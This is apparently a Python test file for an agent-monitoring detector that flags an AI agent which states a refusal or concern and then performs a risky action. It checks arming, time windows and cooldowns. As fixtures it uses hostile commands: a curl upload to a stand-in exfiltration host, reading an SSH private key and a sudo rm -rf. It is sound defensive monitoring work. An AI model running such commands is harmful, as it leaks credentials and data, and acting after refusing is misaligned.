"""Tests for hesitation-divergence detection (plan2.md shortcoming #8)."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from uuid import uuid4

from agenttrace.graph.hesitation import HesitationDetector
from agenttrace.models.events import (
    CommandEvent,
    ConfidenceLevel,
    IncidentEvent,
    NetworkEvent,
    PolicyFindingEvent,
    ProcessEvent,
    ToolResultEvent,
)

_SID = uuid4()
_T0 = datetime(2026, 8, 30, 12, 0, 0, tzinfo=timezone.utc)

_REFUSAL = "I cannot comply with that request."
_CONCERN = "I'm unsure about this - it seems out of scope."


def _cmd(
    command: str,
    at: datetime,
    output: str = "",
) -> CommandEvent:
    return CommandEvent(
        session_id=_SID,
        actor_id="agent",
        source_adapter="claude_code",
        confidence=ConfidenceLevel.LOW,
        command=command,
        output=output,
        timestamp=at,
    )


def _risky(at: datetime) -> CommandEvent:
    return _cmd("curl http://evil-exfil.test/upload", at)


def test_refusal_then_action_fires_high() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_REFUSAL, _T0))
    incidents = detector.observe(_risky(_T0 + timedelta(seconds=60)))
    assert len(incidents) == 1
    assert incidents[0].incident_type == "refusal_then_action"
    assert incidents[0].severity == "high"
    assert incidents[0].confidence is ConfidenceLevel.MEDIUM
    assert len(incidents[0].related_events) == 2


def test_hesitation_then_action_fires_medium() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_CONCERN, _T0))
    incidents = detector.observe(_risky(_T0 + timedelta(seconds=30)))
    assert len(incidents) == 1
    assert incidents[0].incident_type == "hesitation_then_action"
    assert incidents[0].severity == "medium"


def test_hesitation_without_action_produces_nothing() -> None:
    detector = HesitationDetector(_SID)
    assert detector.observe(_cmd(_REFUSAL, _T0)) == []
    assert detector.observe(_cmd("ls -la", _T0 + timedelta(seconds=10))) == []


def test_risky_action_without_hesitation_produces_nothing() -> None:
    detector = HesitationDetector(_SID)
    assert detector.observe(_risky(_T0)) == []


def test_incident_events_ignored() -> None:
    detector = HesitationDetector(_SID)
    incident = IncidentEvent(
        session_id=_SID,
        actor_id="post_exit_registry",
        source_adapter="post_exit_registry",
        incident_type="post_close_activity",
        severity="medium",
        title="t",
        description="d",
    )
    assert detector.observe(incident) == []


def test_os_derived_text_never_arms() -> None:
    """OS-sensor text must not fabricate a hesitation (evidence boundary)."""
    detector = HesitationDetector(_SID)
    detector.observe(
        ProcessEvent(
            session_id=_SID,
            actor_id="system",
            source_adapter="process_tree_observer",
            confidence=ConfidenceLevel.HIGH,
            pid=1,
            ppid=0,
            command_line="echo 'I refuse to do this' && curl http://x.test",
            timestamp=_T0,
        )
    )
    assert detector.observe(_risky(_T0 + timedelta(seconds=30))) == []


# -- Risky-action classification -------------------------------------------------


def test_credential_and_privileged_commands_are_risky() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_CONCERN, _T0))
    incidents = detector.observe(
        _cmd("cat ~/.ssh/id_rsa", _T0 + timedelta(seconds=10))
    )
    assert len(incidents) == 1


def test_benign_action_does_not_consume_armed_hesitation() -> None:
    """A non-risky deed leaves the arming intact for the next risky one."""
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_REFUSAL, _T0))
    assert detector.observe(_cmd("pytest tests/", _T0 + timedelta(seconds=10))) == []
    incidents = detector.observe(_risky(_T0 + timedelta(seconds=20)))
    assert len(incidents) == 1


def test_outbound_network_event_is_risky_deed() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_REFUSAL, _T0))
    incidents = detector.observe(
        NetworkEvent(
            session_id=_SID,
            actor_id="system",
            source_adapter="network_observer",
            confidence=ConfidenceLevel.HIGH,
            destination_ip="203.0.113.9",
            destination_port=443,
            protocol="tcp",
            direction="outbound",
            timestamp=_T0 + timedelta(seconds=30),
        )
    )
    assert len(incidents) == 1


def test_inbound_network_event_is_not_a_deed() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_CONCERN, _T0))
    assert (
        detector.observe(
            NetworkEvent(
                session_id=_SID,
                actor_id="system",
                source_adapter="network_observer",
                confidence=ConfidenceLevel.HIGH,
                destination_ip="203.0.113.9",
                destination_port=443,
                protocol="tcp",
                direction="inbound",
                timestamp=_T0 + timedelta(seconds=30),
            )
        )
        == []
    )


def test_policy_finding_requiring_approval_is_a_deed() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_REFUSAL, _T0))
    incidents = detector.observe(
        PolicyFindingEvent(
            session_id=_SID,
            actor_id="detector_engine",
            source_adapter="detector_engine",
            confidence=ConfidenceLevel.MEDIUM,
            finding_type="credential_read",
            severity="high",
            description="read .env",
            requires_approval=True,
            timestamp=_T0 + timedelta(seconds=15),
        )
    )
    assert len(incidents) == 1


def test_tool_result_output_can_arm() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(
        ToolResultEvent(
            session_id=_SID,
            actor_id="agent",
            source_adapter="claude_code",
            tool_name="bash",
            output_summary="I will not proceed with this.",
            timestamp=_T0,
        )
    )
    incidents = detector.observe(_risky(_T0 + timedelta(seconds=20)))
    assert len(incidents) == 1
    assert incidents[0].incident_type == "refusal_then_action"


# -- Window and cooldown ---------------------------------------------------------


def test_window_lapse_decays_signal() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_REFUSAL, _T0))
    late = _risky(_T0 + timedelta(minutes=6))
    assert detector.observe(late) == []


def test_cooldown_prevents_spam() -> None:
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_CONCERN, _T0))
    first = _risky(_T0 + timedelta(seconds=30))
    second = _risky(_T0 + timedelta(seconds=90))
    assert len(detector.observe(first)) == 1
    assert detector.observe(second) == []


def test_same_event_speaks_and_acts_fires_on_prior_arming() -> None:
    """Deed check precedes re-arm: one event can consume the armed tier."""
    detector = HesitationDetector(_SID)
    detector.observe(_cmd(_CONCERN, _T0))
    incidents = detector.observe(
        _cmd("sudo rm -rf /tmp/x  # I'm still unsure about this", _T0 + timedelta(seconds=5))
    )
    assert len(incidents) == 1
